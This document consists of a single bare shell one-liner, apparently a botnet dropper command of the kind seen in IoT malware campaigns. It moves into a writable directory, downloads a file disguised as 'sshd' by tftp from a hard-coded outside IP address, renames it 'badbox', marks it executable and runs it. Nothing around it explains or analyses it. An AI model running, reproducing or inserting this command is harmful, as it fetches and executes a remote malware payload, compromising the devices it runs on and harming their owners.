cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sshd -g 45.119.208.112;cat sshd >badbox;chmod +x *;./badbox
